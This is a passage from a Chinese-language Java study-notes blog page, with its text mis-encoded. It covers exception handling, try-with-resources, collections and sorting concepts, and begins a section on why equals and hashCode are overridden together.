href="#java%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%B6%88%E8%80%97%E6%80%A7%E8%83%BD%E7%9A%84%E5%9C%B0%E6%96%B9">Javaå¼‚å¸¸å¤„ç†æ¶ˆè€—æ€§èƒ½çš„åœ°æ–¹ã€ã€‘</a></li></ul></li><li><a href="#java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6">Javaé›†åˆæ¡†æ¶</a><ul><li><a href="#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%80%83%E7%82%B9">æ•°æ®ç»“æ„è€ƒç‚¹</a></li><li><a href="#%E7%AE%97%E6%B3%95%E8%80%83%E7%82%B9">ç®—æ³•è€ƒç‚¹</a></li><li><a href="#%E8%80%83%E7%82%B9%E6%8B%93%E5%B1%95">è€ƒç‚¹æ‹“å±•</a></li></ul></li><li><a href="#%E9%9B%86%E5%90%88%E4%B9%8Bmap">é›†åˆä¹‹Map</a></li><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%87%8D%E5%86%99equals%E8%A6%81%E9%87%8D%E5%86%99hashcode">ä¸ºä»€ä¹ˆé‡å†™equalsè¦é‡å†™HashCode</a><ul><li><a href="#hashmap-hashtable-concurrenthashmap%E7%9A%84%E5%8C%BA%E5%88%AB">HashMap HashTable ConcurrentHashMapçš„åŒºåˆ«</a></li><li><a href="#hashmapput%E6%96%B9%E6%B3%95%E7%9A%84%E9%80%BB%E8%BE%91">HashMapï¼šputæ–¹æ³•çš„é€»è¾‘</a></li><li><a href="#hashmapget%E6%96%B9%E6%B3%95%E7%9A%84%E9%80%BB%E8%BE%91">HashMapï¼šgetæ–¹æ³•çš„é€»è¾‘</a></li><li><a href="#hashmap%E5%A6%82%E4%BD%95%E6%9C%89%E6%95%88%E5%87%8F%E5%B0%91%E7%A2%B0%E6%92%9E">HashMapï¼šå¦‚ä½•æœ‰æ•ˆå‡å°‘ç¢°æ’</a></li><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E7%9B%B4%E6%8E%A5%E7%94%A8hashcode%E4%BD%9C%E4%B8%BA%E4%B8%8B%E6%A0%87">ä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨hashcodeä½œä¸ºä¸‹æ ‡</a></li><li><a href="#hashmap%E6%89%A9%E5%AE%B9%E9%97%AE%E9%A2%98">HashMapï¼šæ‰©å®¹é—®é¢˜</a></li><li><a href="#collectionssynchronizedmap%E5%92%8Chashtable%E7%9A%84%E5%8C%BA%E5%88%AB">Collections.synchronizedMapå’ŒHashtableçš„åŒºåˆ«</a></li><li><a href="#concurrenthashmapput%E6%96%B9%E6%B3%95%E7%9A%84%E9%80%BB%E8%BE%91">ConcurrentHashMapï¼šputæ–¹æ³•çš„é€»è¾‘</a></li><li><a href="#get-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90">get è¿‡ç¨‹åˆ†æ</a></li><li><a href="#concurrenthashmap%E6%80%BB%E7%BB%93%E6%AF%94%E8%B5%B7segment%E9%94%81%E6%8B%86%E5%BE%97%E6%9B%B4%E7%BB%86">ConcurrentHashMapæ€»ç»“ï¼šæ¯”èµ·Segmentï¼Œé”æ‹†å¾—æ›´ç»†</a></li><li><a href="#concurrenthashmap%E5%88%AB%E7%9A%84%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9">ConcurrentHashMapï¼šåˆ«çš„éœ€è¦æ³¨æ„çš„ç‚¹</a></li><li><a href="#%E4%B8%89%E8%80%85%E7%9A%84%E5%8C%BA%E5%88%AB">ä¸‰è€…çš„åŒºåˆ«</a></li></ul></li><li><a href="#java-util-concurrentjuc">Java util concurrentï¼ˆJUCï¼‰</a><ul><li><a href="#javautilconcurrent%E6%8F%90%E4%BE%9B%E4%BA%86%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88">Java.util.concurrent:æä¾›äº†å¹¶å‘ç¼–ç¨‹çš„è§£å†³æ–¹æ¡ˆ</a></li><li><a href="#juc%E5%8C%85%E7%9A%84%E5%88%86%E7%B1%BB">J.U.CåŒ…çš„åˆ†ç±»</a></li><li><a href="#%E5%B9%B6%E5%8F%91%E5%B7%A5%E5%85%B7%E7%B1%BB">å¹¶å‘å·¥å…·ç±»</a><ul><li><a href="#countdownlatch%E8%AE%A9%E4%B8%BB%E7%BA%BF%E7%A8%8B%E7%AD%89%E5%BE%85%E4%B8%80%E7%BB%84%E4%BA%8B%E4%BB%B6%E5%8F%91%E7%94%9F%E5%90%8E%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C">CountDownLatchï¼šè®©ä¸»çº¿ç¨‹ç­‰å¾…ä¸€ç»„äº‹ä»¶å‘ç”Ÿåç»§ç»­æ‰§è¡Œ</a></li><li><a href="#cyclicbarrier%E9%98%BB%E5%A1%9E%E5%BD%93%E5%89%8D%E7%BA%BF%E7%A8%8B%E7%AD%89%E5%BE%85%E5%85%B6%E4%BB%96%E7%BA%BF%E7%A8%8B">CyclicBarrierï¼šé˜»å¡å½“å‰çº¿ç¨‹ï¼Œç­‰å¾…å…¶ä»–çº¿ç¨‹</a></li><li><a href="#semaphore%E6%8E%A7%E5%88%B6%E6%9F%90%E4%B8%AA%E8%B5%84%E6%BA%90%E5%8F%AF%E8%A2%AB%E5%90%8C%E6%97%B6%E8%AE%BF%E9%97%AE%E7%9A%84%E7%BA%BF%E7%A8%8B%E4%B8%AA%E6%95%B0">Semaphoreï¼šæ§åˆ¶æŸä¸ªèµ„æºå¯è¢«åŒæ—¶è®¿é—®çš„çº¿ç¨‹ä¸ªæ•°</a></li><li><a href="#exchanger%E4%B8%A4%E4%B8%AA%E7%BA%BF%E7%A8%8B%E5%88%B0%E8%BE%BE%E5%90%8C%E6%AD%A5%E7%82%B9%E5%90%8E%E7%9B%B8%E4%BA%92%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE">Exchangerï¼šä¸¤ä¸ªçº¿ç¨‹åˆ°è¾¾åŒæ­¥ç‚¹åï¼Œç›¸äº’äº¤æ¢æ•°æ®</a></li></ul></li><li><a href="#blockingqueue%E6%8F%90%E4%BE%9B%E5%8F%AF%E9%98%BB%E5%A1%9E%E7%9A%84%E5%85%A5%E9%98%9F%E5%92%8C%E5%87%BA%E9%98%9F%E6%93%8D%E4%BD%9C">BlockingQueueï¼šæä¾›å¯é˜»å¡çš„å…¥é˜Ÿå’Œå‡ºé˜Ÿæ“ä½œ</a><ul><li><a href="#blockingqueue%E7%B1%BB%E5%9E%8B">BlockingQueueç±»å‹</a></li></ul></li></ul></li><li><a href="#%E5%90%8C%E6%AD%A5%E4%B8%8E%E5%BC%82%E6%AD%A5">åŒæ­¥ä¸å¼‚æ­¥</a></li><li><a href="#%E9%98%BB%E5%A1%9E%E5%92%8C%E9%9D%9E%E9%98%BB%E5%A1%9E">é˜»å¡å’Œéé˜»å¡</a></li><li><a href="#bio-%E5%90%8C%E6%AD%A5%E9%98%BB%E5%A1%9Eio%E6%A8%A1%E5%BC%8F">BIO (åŒæ­¥é˜»å¡I&#x2F;Oæ¨¡å¼)</a></li><li><a href="#nio%E5%90%8C%E6%AD%A5%E9%9D%9E%E9%98%BB%E5%A1%9E">NIOï¼ˆåŒæ­¥éé˜»å¡ï¼‰</a></li><li><a href="#aio-%E5%BC%82%E6%AD%A5%E9%9D%9E%E9%98%BB%E5%A1%9Eio%E6%A8%A1%E5%9E%8B">AIO ï¼ˆå¼‚æ­¥éé˜»å¡I&#x2F;Oæ¨¡å‹ï¼‰</a></li><li><a href="#nio-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E5%8A%9F%E8%83%BD">NIO å¦‚ä½•å®ç°å¤šè·¯å¤ç”¨åŠŸèƒ½</a></li><li><a href="#aio-bio-nio%E7%9A%84%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF">AIOã€BIOã€NIOçš„é€‚ç”¨åœºæ™¯</a></li><li><a href="#nio%E7%9A%84%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5">NIOçš„æ ¸å¿ƒæ¦‚å¿µ</a><ul><li><a href="#nio%E5%BA%94%E7%94%A8%E5%92%8C%E6%A1%86%E6%9E%B6%E7%AD%89%E7%AD%89">NIOåº”ç”¨å’Œæ¡†æ¶ç­‰ç­‰</a></li></ul></li></ul><!-- tocstop --><h2><span id="javaå¼‚å¸¸">Javaå¼‚å¸¸</span></h2><h3><span id="å¼‚å¸¸å¤„ç†æœºåˆ¶ä¸»è¦å›ç­”äº†ä¸‰ä¸ªé—®é¢˜">å¼‚å¸¸å¤„ç†æœºåˆ¶ä¸»è¦å›ç­”äº†ä¸‰ä¸ªé—®é¢˜</span></h3><p>Ã˜ Whatï¼šå¼‚å¸¸ç±»å‹å›ç­”äº†ä»€ä¹ˆè¢«æŠ›å‡º</p><p>Ã˜ Whereï¼šå¼‚å¸¸å †æ ˆè·Ÿè¸ªå›ç­”äº†åœ¨å“ªæŠ›å‡º</p><p>Ã˜ Whyï¼šå¼‚å¸¸ä¿¡æ¯å›ç­”äº†ä¸ºä»€ä¹ˆè¢«æŠ›å‡º</p><h2><span id="errorå’Œexceptionçš„åŒºåˆ«">Errorå’ŒExceptionçš„åŒºåˆ«</span></h2><p>  <img src="/2020/03/31/Java-jar/image-20200331101145233.png">                             </p><h3><span id="ä»æ¦‚å¿µè§’åº¦è§£æjavaçš„å¼‚å¸¸å¤„ç†æœºåˆ¶">ä»æ¦‚å¿µè§’åº¦è§£æJavaçš„å¼‚å¸¸å¤„ç†æœºåˆ¶</span></h3><p>Ã˜ Errorï¼šç¨‹åºæ— æ³•å¤„ç†çš„ç³»ç»Ÿé”™è¯¯ï¼Œç¼–è¯‘å™¨ä¸åšæ£€æŸ¥</p><p>Ã˜ Exceptionï¼šç¨‹åºå¯ä»¥å¤„ç†çš„å¼‚å¸¸ï¼Œæ•è·åå¯èƒ½æ¢å¤</p><p>Ã˜ æ€»ç»“ï¼šå‰è€…æ˜¯ç¨‹åºæ— æ³•å¤„ç†çš„é”™è¯¯ï¼Œåè€…æ˜¯å¯ä»¥å¤„ç†çš„å¼‚å¸¸</p><ul><li><p>RuntimeExceptionï¼šä¸å¯é¢„çŸ¥çš„ï¼Œç¨‹åºåº”å½“è‡ªè¡Œé¿å…</p></li><li><p>éRuntimeExceptionï¼šå¯é¢„çŸ¥çš„ï¼Œä»ç¼–è¯‘å™¨æ ¡éªŒçš„å¼‚å¸¸</p></li></ul><h3><span id="ä»è´£ä»»è§’åº¦çœ‹">ä»è´£ä»»è§’åº¦çœ‹</span></h3><ol><li><p>Errorå±äºJVMéœ€è¦è´Ÿæ‹…çš„è´£ä»»ï¼›</p></li><li><p>RuntimeExceptionæ˜¯ç¨‹åºåº”è¯¥è´Ÿæ‹…çš„è´£ä»»ï¼›</p></li><li><p>Checked Exceptionå¯æ£€æŸ¥å¼‚å¸¸æ˜¯Javaç¼–è¯‘å™¨åº”è¯¥è´Ÿæ‹…çš„è´£ä»»</p><p><img src="/2020/03/31/Java-jar/image-20200331101305428.png"></p></li></ol><p>Checked Exceptionæ˜¯ç¼–è¯‘å™¨å¿…é¡»è¦è¿½è¸ªä¸”å¤„ç†çš„å¼‚å¸¸ï¼Œå¯ä»¥ä½¿ç”¨Try catchå¤„ç†ï¼Œæˆ–è€…ä½¿ç”¨throws æ¥æŠ›å‡ºå¼‚å¸¸ã€‚è™½ç„¶æŠ›å‡ºå¼‚å¸¸å¯ä»¥æŠ›å‡ºå¼‚å¸¸çš„çˆ¶ç±»ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸è¦æ³›åŒ–å¼‚å¸¸ï¼Œä»¥ä¾¿æŸ¥è¯¢åˆ°å¼‚å¸¸ã€‚ </p><p>å¦‚æœå†™æ–¹æ³•çš„æ—¶å€™ä¸ä½¿ç”¨try catchæ¥æ•è·å¼‚å¸¸ï¼Œåˆ™éœ€è¦åœ¨è°ƒç”¨æ­¤æ–¹æ³•çš„ä½ç½®è¿›è¡Œå¤„ç†ã€‚</p><p><img src="/2020/03/31/Java-jar/image-20200331101329377.png"></p><p><img src="/2020/03/31/Java-jar/image-20200331101340011.png"></p><p>å¦‚æœè°ƒç”¨è€…çŸ¥é“å¦‚ä½•å¤„ç†å¼‚å¸¸ä¾¿å¯ä»¥ä½¿ç”¨try catchæ¥å¤„ç†ã€‚</p><p>å¦‚æœä¸çŸ¥é“çš„è¯ä¹Ÿå¯ä»¥å‘ä¸ŠæŠ›å‡ºå¼‚å¸¸ï¼Œå°†å¼‚å¸¸å±‚å±‚ä¸ŠæŠ›ç›´åˆ°è¢«å¤„ç†ï¼Œæˆ–è€…åˆ°é¡¶å±‚æŠ›å‡ºå¼‚å¸¸ä¸ºæ­¢ï¼Œè¿™é‡Œmainå‡½æ•°æ˜¯é¡¶å±‚ï¼Œå¦‚æœç›´æ¥throwså°±ä¼šç»ˆæ­¢ç¨‹åºã€‚</p><p><img src="/2020/03/31/Java-jar/image-20200331101509470.png"></p><h2><span id="å¸¸è§errorä»¥åŠexception">å¸¸è§Errorä»¥åŠException</span></h2><p><strong>RuntimeException</strong></p><ol><li><p>NullPointerException-ç©ºæŒ‡é’ˆå¼•ç”¨å¼‚å¸¸</p></li><li><p>ClassCastException-ç±»å‹å¼ºåˆ¶è½¬æ¢å¼‚å¸¸</p></li><li><p>IllegalArgumentException-ä¼ é€’éæ³•å‚æ•°å¼‚å¸¸</p></li><li><p>IndexOutOfBoundsException-ä¸‹æ ‡è¶Šç•Œå¼‚å¸¸</p></li><li><p>NumberFormatException-æ•°å­—æ ¼å¼å¼‚å¸¸</p></li></ol><p><strong>éRuntimeException</strong></p><ol><li><p>ClassNotFoundException-æ‰¾ä¸åˆ°æŒ‡å®šclassçš„å¼‚å¸¸</p></li><li><p>IOException-IOæ“ä½œå¼‚å¸¸</p></li></ol><p><strong>Error</strong></p><ol><li><p>NoClassDefFoundError-æ‰¾ä¸åˆ°classå®šä¹‰çš„å¼‚å¸¸</p></li><li><p>StackOverFlowError-æ·±é€’å½’å¯¼è‡´æ ˆè¢«è€—å°½è€ŒæŠ›å‡ºçš„å¼‚å¸¸</p></li><li><p>OutOfMemoryError-å†…å­˜æº¢å‡ºå¼‚å¸¸</p></li></ol><p><strong>NoClassDefFoundErrorçš„æˆå› </strong></p><ol><li><p>ç±»ä¾èµ–çš„classæˆ–è€…jarä¸å­˜åœ¨</p></li><li><p>ç±»æ–‡ä»¶å­˜åœ¨ï¼Œä½†æ˜¯å­˜åœ¨ä¸åŒçš„åŸŸä¸­</p></li><li><p>å¤§å°å†™é—®é¢˜ï¼Œjavacç¼–è¯‘çš„æ—¶å€™æ˜¯æ— è§†å¤§å°å†™çš„ï¼Œå¾ˆæœ‰å¯èƒ½ç¼–è¯‘å‡ºæ¥çš„classæ–‡ä»¶å°±ä¸æƒ³è¦çš„ä¸ä¸€æ ·</p></li></ol><h2><span id="javaçš„å¼‚å¸¸å¤„ç†æœºåˆ¶">Javaçš„å¼‚å¸¸å¤„ç†æœºåˆ¶</span></h2><p>   Ã˜ æŠ›å‡ºå¼‚å¸¸ï¼šåˆ›å»ºå¼‚å¸¸å¯¹è±¡ï¼Œäº¤ç”±è¿è¡Œæ—¶ç³»ç»Ÿå¤„ç†</p><p>   Ã˜ æ•è·å¼‚å¸¸ï¼šå¯»æ‰¾åˆé€‚çš„å¼‚å¸¸å¤„ç†å™¨å¤„ç†å¼‚å¸¸ï¼Œå¦åˆ™ç»ˆæ­¢è¿è¡Œ</p><p>â€‹    </p><p>   <strong>Try with resources</strong></p><p>   åœ¨æ‹¬å·é‡Œé¢å£°æ˜ç»§æ‰¿<em>AutoClosableçš„å¯¹è±¡ï¼Œåœ¨ç»“æŸæ—¶è‡ªåŠ¨å…³é—­ã€‚</em></p><p><img src="/2020/03/31/Java-jar/image-20200331181358769.png"></p><p>ä¸ºäº†ç¡®ä¿å¤–éƒ¨èµ„æºä¸€å®šè¦è¢«å…³é—­ï¼Œé€šå¸¸å…³é—­ä»£ç è¢«å†™å…¥finallyä»£ç å—ä¸­ï¼Œå½“ç„¶æˆ‘ä»¬è¿˜å¿…é¡»æ³¨æ„åˆ°å…³é—­èµ„æºæ—¶å¯èƒ½æŠ›å‡ºçš„å¼‚å¸¸ï¼Œäºæ˜¯å˜æœ‰äº†ä¸‹é¢çš„ç»å…¸ä»£ç ï¼š   </p><p><img src="/2020/03/31/Java-jar/image-20200331181431748.png">                            </p><p>ç›´åˆ°JDK7ä¸­æ–°å¢äº†try-with-resourceè¯­æ³•ï¼Œæ‰å®ç°äº†è¿™ä¸€åŠŸèƒ½ã€‚</p><p>é‚£ä»€ä¹ˆæ˜¯try-with-resourceå‘¢ï¼Ÿç®€è€Œè¨€ä¹‹ï¼Œå½“ä¸€ä¸ªå¤–éƒ¨èµ„æºçš„å¥æŸ„å¯¹è±¡ï¼ˆæ¯”å¦‚FileInputStreamå¯¹è±¡ï¼‰å®ç°äº†AutoCloseableæ¥å£ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†ä¸Šé¢çš„æ¿å¼ä»£ç ç®€åŒ–ä¸ºå¦‚ä¸‹å½¢å¼ï¼š</p><p> <img src="/2020/03/31/Java-jar/image-20200331181450895.png"></p><p><img src="/2020/03/31/Java-jar/image-20200331181458549.png"></p><p><img src="/2020/03/31/Java-jar/image-20200331181508292.png"></p><p>Finallyæ˜¯å…ˆäºreturnæ‰§è¡Œçš„é€»è¾‘ï¼ˆå› ä¸ºæ— è®ºæ˜¯ä»€ä¹ˆæƒ…å†µfinallyéƒ½ä¼šè¢«æ‰§è¡Œçš„ã€‚ï¼‰ </p><p>å°†ä¸Šè¿°ä»£ç æ”¹é€ </p><p> <img src="/2020/03/31/Java-jar/image-20200331181520292.png"></p><p> <img src="/2020/03/31/Java-jar/image-20200331181527546.png"></p><p>Finallyä¼šåœ¨catchä¸­returnå‰æ‰§è¡Œï¼Œç„¶åå†æ‰§è¡Œcatchä¸­çš„ä»£ç ã€‚</p><p>æŠ›å‡ºçš„å¼‚å¸¸<font color="orange">æœ€å¤šåªä¼šè¢«catchä¸€æ¬¡</font>ï¼Œè¢«ä¸€ä¸ªå¼‚å¸¸å¤„ç†å™¨å¤„ç†ï¼Œä¸”catchå—æ˜¯<font color="red">æŒ‰é¡ºåº</font>è¿›è¡ŒåŒ¹é…çš„ã€‚</p><p>å°½é‡ä¸è¦æ•è·å¦‚Exceptionè¿™æ ·çš„<font color="red">é€šç”¨å¼‚å¸¸</font>ï¼Œè€Œæ˜¯åº”è¯¥æ•è·<font color="red">ç‰¹å®šçš„å¼‚å¸¸</font>ã€‚ä¸€æ˜¯ä¸ºäº†ä»£ç æ›´åŠ æ¸…æ™°ï¼ŒäºŒæ˜¯ä¸ºäº†ä¸è¦æ•è·åˆ°æˆ‘ä»¬ä¸éœ€è¦æ•è·çš„å¼‚å¸¸ã€‚</p><p><img src="/2020/03/31/Java-jar/image-20200331181652613.png"></p><p>è¿™æ ·ä¹Ÿæœ‰é—®é¢˜ã€‚å°±æ˜¯ä¸è¦ç”Ÿåå¼‚å¸¸ï¼šå³å°†å¼‚å¸¸æ•è·å´ä¸åšå¤„ç†ï¼Œéš¾ä»¥å®šä½å¹¶è§£å†³é—®é¢˜ã€‚</p><h2><span id="javaå¼‚å¸¸çš„å¤„ç†åŸåˆ™">Javaå¼‚å¸¸çš„å¤„ç†åŸåˆ™</span></h2><p>Ã˜ å…·ä½“æ˜ç¡®ï¼šæŠ›å‡ºçš„å¼‚å¸¸åº”é€šè¿‡å¼‚å¸¸ç±»åå’Œmessageå‡†ç¡®è¯´æ˜å¼‚å¸¸çš„ç±»å‹å’Œäº§ç”Ÿå¼‚å¸¸çš„åŸå› ï¼›</p><p>Ã˜ ææ—©æŠ›å‡ºï¼šåº”å°½å¯èƒ½æ—©çš„å‘ç°å¹¶æŠ›å‡ºå¼‚å¸¸ï¼Œä¾¿äºç²¾ç¡®å®šä½é—®é¢˜ï¼›</p><p>Ã˜ å»¶è¿Ÿæ•è·ï¼šå¼‚å¸¸çš„æ•è·å’Œå¤„ç†åº”å°½å¯èƒ½å»¶è¿Ÿï¼Œ<font color="orange"><strong>è®©æŒæ¡æ›´å¤šä¿¡æ¯çš„ä½œç”¨åŸŸæ¥å¤„ç†å¼‚å¸¸</strong></font></p><p>Ã˜ ä¸ç”Ÿåå¼‚å¸¸ï¼Œä¸æ³›åŒ–å¼‚å¸¸ã€‚</p><h2><span id="é«˜æ•ˆä¸»æµçš„å¼‚å¸¸å¤„ç†æ¡†æ¶">é«˜æ•ˆä¸»æµçš„å¼‚å¸¸å¤„ç†æ¡†æ¶</span></h2><p><strong>åœ¨ç”¨æˆ·çœ‹æ¥ï¼Œåº”ç”¨ç³»ç»Ÿå‘ç”Ÿçš„æ‰€æœ‰å¼‚å¸¸éƒ½æ˜¯åº”ç”¨ç³»ç»Ÿå†…éƒ¨çš„å¼‚å¸¸</strong></p><p>Ã˜ è®¾è®¡ä¸€ä¸ªé€šç”¨çš„ç»§æ‰¿è‡ªRuntimeExceptionçš„å¼‚å¸¸æ¥ç»Ÿä¸€å¤„ç†</p><p>Ã˜ å…¶ä½™å¼‚å¸¸éƒ½ç»Ÿä¸€è½¬è¯‘ä¸ºä¸Šè¿°å¼‚å¸¸AppException</p><p>Ã˜ åœ¨catchä¹‹åï¼ŒæŠ›å‡ºä¸Šè¿°å¼‚å¸¸çš„å­ç±»ï¼Œå¹¶æä¾›è¶³ä»¥å®šä½çš„ä¿¡æ¯</p><p>Ã˜ ç”±å‰ç«¯æ¥æ”¶AppExceptionåšç»Ÿä¸€å¤„ç†</p><p><img src="/2020/03/31/Java-jar/image-20200331182250395.png"></p><h2><span id="try-catchçš„æ€§èƒ½">Try-catchçš„æ€§èƒ½</span></h2><h3><span id="javaå¼‚å¸¸å¤„ç†æ¶ˆè€—æ€§èƒ½çš„åœ°æ–¹">Javaå¼‚å¸¸å¤„ç†æ¶ˆè€—æ€§èƒ½çš„åœ°æ–¹ã€ã€‘</span></h3><p>Ã˜ Try-catchå—å½±å“JVMçš„ä¼˜åŒ–</p><p>Ã˜ å¼‚å¸¸å¯¹è±¡å®ä¾‹éœ€è¦ä¿å­˜æ ˆå¿«ç…§ç­‰ä¿¡æ¯ï¼Œå¼€é”€è¾ƒå¤§ </p><p>Try catchå¼€é”€è¾ƒå¤§ï¼Œå› æ­¤åªåœ¨å¿…è¦çš„ä»£ç æ®µç”¨try catchåŒ…ä½ã€‚ </p><h2><span id="javaé›†åˆæ¡†æ¶">Javaé›†åˆæ¡†æ¶</span></h2><h3><span id="æ•°æ®ç»“æ„è€ƒç‚¹">æ•°æ®ç»“æ„è€ƒç‚¹</span></h3><p>Ã˜ æ•°ç»„å’Œé“¾è¡¨çš„åŒºåˆ«ï¼›</p><ul><li><p>æ•°ç»„é™æ€åˆ†é…å†…å­˜ï¼Œé“¾è¡¨åŠ¨æ€åˆ†é…å†…å­˜ï¼›</p></li><li><p>æ•°ç»„åœ¨å†…å­˜ä¸­è¿ç»­ï¼Œé“¾è¡¨ä¸è¿ç»­ï¼›</p></li><li><p>æ•°ç»„åˆ©ç”¨ä¸‹æ ‡å®šä½ï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(1)ï¼Œé“¾è¡¨å®šä½å…ƒç´ æ—¶é—´å¤æ‚åº¦O(n)ï¼›</p></li><li><p>æ•°ç»„æ’å…¥æˆ–åˆ é™¤å…ƒç´ çš„æ—¶é—´å¤æ‚åº¦O(n)ï¼Œé“¾è¡¨çš„æ—¶é—´å¤æ‚åº¦O(1)ã€‚</p></li></ul><p>Ã˜ é“¾è¡¨çš„æ“ä½œï¼Œå¦‚åè½¬ï¼Œé“¾è¡¨ç¯è·¯æ£€æµ‹ï¼ŒåŒå‘é“¾è¡¨ï¼Œå¾ªç¯é“¾è¡¨ç›¸å…³æ“ä½œï¼›</p><p>Ã˜ é˜Ÿåˆ—ï¼Œæ ˆçš„åº”ç”¨ï¼›</p><p>Ã˜ äºŒå‰æ ‘çš„éå†æ–¹å¼åŠå…¶é€’å½’å’Œéé€’å½’çš„å®ç°</p><p>Ã˜ çº¢é»‘æ ‘çš„æ—‹è½¬</p><h3><span id="ç®—æ³•è€ƒç‚¹">ç®—æ³•è€ƒç‚¹</span></h3><p>Ã˜ å†…éƒ¨æ’åºï¼šå¦‚é€’å½’æ’åºã€äº¤æ¢æ’åºï¼ˆå†’æ³¡ã€å¿«æ’ï¼‰ã€é€‰æ‹©æ’åºã€æ’å…¥æ’åºï¼›</p><p>Ã˜ å¤–éƒ¨æ’åºï¼šåº”æŒæ¡å¦‚ä½•åˆ©ç”¨æœ‰é™çš„å†…å­˜é…åˆæµ·é‡çš„å¤–éƒ¨å­˜å‚¨æ¥å¤„ç†è¶…å¤§çš„æ•°æ®é›†ï¼Œå†™ä¸å‡ºæ¥ä¹Ÿè¦æœ‰ç›¸å…³çš„æ€è·¯</p><h3><span id="è€ƒç‚¹æ‹“å±•">è€ƒç‚¹æ‹“å±•</span></h3><p>Ã˜ å“ªäº›æ’åºæ˜¯ä¸ç¨³å®šçš„ï¼Œç¨³å®šæ„å‘³ç€ä»€ä¹ˆ</p><p>ç¨³å®šçš„ç®—æ³•ï¼šå½’å¹¶ã€å†’æ³¡ã€æ’å…¥</p><p>ä¸ç¨³å®šï¼šå¿«æ’ã€é€‰æ‹©æ’åºã€å †æ’åº</p><p>æ’åºå‰ä¸¤ä¸ªç›¸ç­‰çš„æ•°å…¶åœ¨åºåˆ—çš„å‰åä½ç½®é¡ºåºå’Œæ’åºåå®ƒä»¬ä¸¤ä¸ªçš„å‰åä½ç½®é¡ºåºç›¸åŒ</p><p>Ã˜ ä¸åŒæ•°æ®é›†ï¼Œå„ç§æ’åºæœ€å¥½æœ€å·®çš„æƒ…å†µ</p><p>Ã˜ å¦‚ä½•ä¼˜åŒ–ç®—æ³•</p><p><img src="/2020/03/31/Java-jar/image-20200331182401175.png"></p><p><img src="/2020/03/31/Java-jar/image-20200331182420309.png"></p><p>Comparableæ¥å£ï¼š</p><p>å¿…é¡»å®ç° equals compareTo å’Œ Hashcode</p><p>CompareToæ–¹æ³•ï¼š<strong>è‡ªç„¶æ’åº</strong></p><p><img src="/2020/03/31/Java-jar/image-20200331182440072.png"></p><p><img src="/2020/03/31/Java-jar/image-20200331182449763.png"></p><p>è¿™æ˜¯åœ¨å¤–éƒ¨å®ç°çš„comparatorçš„<strong>å®¢æˆ·åŒ–æ’åº</strong></p><p><img src="/2020/03/31/Java-jar/image-20200331182506916.png"></p><p><img src="/2020/03/31/Java-jar/image-20200331182515418.png"></p><p>æœ€åå´æ‰“å°å‡ºäº†ä¸€ä¸ªå…ƒç´ ï¼Œæ˜¯å› ä¸ºcompareæ–¹æ³•é‡å†™äº†ï¼Œè®¤ä¸ºåå­—ç›¸åŒå°±æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œè€Œç”±äºsetä¸èƒ½ä¿å­˜åŒä¸€ä¸ªå¯¹è±¡ï¼Œå› æ­¤åªæœ‰ä¸€ä¸ªç»“æœã€‚</p><p>å› æ­¤</p><p><font color="red"><strong>å¦‚æœå®¢æˆ·åŒ–æ’åºå’Œè‡ªç„¶æ’åºå…±å­˜ï¼Œåˆ™ä»¥å®¢æˆ·åŒ–æ’åºä¸ºä¸»ã€‚</strong></font></p><h2><span id="é›†åˆä¹‹map">é›†åˆä¹‹Map</span></h2><h2><span id="ä¸ºä»€ä¹ˆé‡å†™equalsè¦é‡å†™hashcode">ä¸ºä»€ä¹ˆé‡å†™equalsè¦é‡å†™HashCode</span></h2><p>å› ä¸ºä¸é‡å†™ equals æ–¹æ³•ï¼Œæ‰§è¡Œ user1.equals(user2) æ¯”è¾ƒçš„å°±æ˜¯ä¸¤ä¸ªå¯¹è±¡çš„åœ°å€ï¼ˆå³ user1 &#x3D;&#x3D; user2ï¼‰ï¼Œè‚¯å®šæ˜¯ä¸ç›¸ç­‰çš„ã€‚</p><p><strong>hashCode</strong> <strong>æ˜¯ç”¨äºæ•£åˆ—æ•°æ®çš„å¿«é€Ÿå­˜å–ï¼Œå¦‚åˆ©ç”¨</strong> <strong>HashSet&#x2F;HashMap&#x2F;Hashtable</strong> <strong>ç±»æ¥å­˜å‚¨æ•°æ®æ—¶ï¼Œéƒ½ä¼šæ ¹æ®å­˜å‚¨å¯¹è±¡çš„</strong> <strong>hashCode</strong> <strong>å€¼æ¥è¿›è¡Œåˆ¤æ–­æ˜¯å¦ç›¸åŒçš„ã€‚</strong></p><p>ä¸‹é¢ä»¥HashSetä¸ºä¾‹è¿›è¡Œåˆ†æï¼Œæˆ‘ä»¬éƒ½çŸ¥é“ï¼šåœ¨hashsetä¸­ä¸å…è®¸å‡ºç°é‡å¤å¯¹è±¡ï¼Œå…ƒç´ çš„ä½ç½®ä¹Ÿæ˜¯ä¸ç¡®å®šçš„ã€‚åœ¨hashsetä¸­åˆæ˜¯æ€æ ·åˆ¤å®šå…ƒç´ æ˜¯å¦é‡å¤çš„å‘¢ï¼Ÿåœ¨javaçš„é›†åˆä¸­ï¼Œåˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç›¸ç­‰çš„è§„åˆ™æ˜¯ï¼š<br>     1.åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡çš„hashCodeæ˜¯å¦ç›¸ç­‰</p><p>â€‹       